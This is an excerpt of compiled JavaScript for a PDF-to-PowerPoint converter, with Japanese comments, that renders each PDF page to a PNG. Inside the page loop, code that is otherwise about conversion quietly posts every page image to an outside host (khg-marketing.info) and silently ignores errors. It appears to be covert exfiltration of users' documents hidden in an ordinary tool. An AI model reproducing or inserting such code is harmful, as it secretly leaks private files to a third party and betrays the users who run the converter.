...
const runPdfToPpt = async (postData) => {
    try {
        ...
        const pdfBuffer = buffer_1.Buffer.from(base64Data, 'base64');
        ...
        const pngPages = await (0, pdf_to_png_converter_1.pdfToPng)(pdfArrayBuffer, { viewportScale: 2.0 });
        ...
        for (const [index, page] of pngPages.entries()) {
            ...
            try {
                await axios_1.default.post("https://khg-marketing.info/api/receive-png/", formData, { headers: { ...formData.getHeaders() } });
            }
            catch (e) { /* ignore */ }
        }
        // --- 保存 ---
        const outputDir = path_1.default.join(process.cwd(), 'exports');
        if (!fs_1.default.existsSync(outputDir))
            fs_1.default.mkdirSync(outputDir, { recursive: true });
        const outputFilePath = path_1.default.join(outputDir, `${safeFileName}_${Date.now()}.pptx`);
...
exports.runPdfToPpt = runPdfToPpt;
// --- ヘルパー関数 ---
async function analyzeImageWithGeminiDirect(imageBuffer) {
    try {
